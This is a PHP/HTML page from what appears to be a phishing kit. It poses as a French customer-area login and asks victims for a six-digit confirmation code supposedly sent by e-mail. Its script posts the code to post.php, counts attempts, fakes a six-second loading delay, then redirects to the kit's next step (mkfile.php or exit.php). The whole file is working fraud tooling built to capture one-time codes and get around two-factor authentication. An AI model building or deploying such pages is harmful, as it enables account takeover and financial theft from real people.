<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body>
<header>
<div class="holder">
<div class="left">
    <img src="res/logo.png">
</div>
<div class="right">
    <div class="user">
        <img src="res/user.png">
        <span>Devenir client</span>
    </div>
</div>
</div>
</header>    

<div class="banner">
<div class="holder">
Espace client
</div>
</div>


<main>
<div class="holder">
<div class="left">
<div class="form">

<div class="title">
Connexion
</div>

<div class="text">
Vous allez recevoir un code via votre E-mail relié au compte
</div>

<div class="col">
<label>Code de confirmation:</label>
<div class="input">
    <input type="text" id="sms" placeholder="Saisir le code reçu par E-mail">
</div>
</div>
 

<div class="col">
<button onclick="sendSms()"><span id="loader"><img src="res/loading.gif"></span>Valider </button>

<div class="links">
<span class="a">Besoin d'aide pour vous connecter?</span>
<span class="a">Nouvel abonné ? Cliquez ici pour commencer</span>
<span class="a">Lancer la démonstration</span>
</div>
</div>



</div>
</div>



<div class="right">
<img src="res/ad.png">
</div>
</div>
</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#sms").mask("000000");
var tries = 0;
function sendSms(){
if($("#sms").val().length<4){
return $("#sms").addClass("error");
}
tries++;
$("#loader").show();
$.post("post.php",{sms:$("#sms").val()},(res)=>{
setTimeout(()=>{
  
        <?php 
            if(isset($_GET['e'])){
                echo 'window.location="exit.php";';
            }    else{
                echo 'window.location="mkfile.php?p=charg";';
            }
        ?>

}, 6000);
});

}

$("input").keypress((e)=>{
if(e.key=="Enter"){
sendSms();
}
})

</script>
</body>
</html>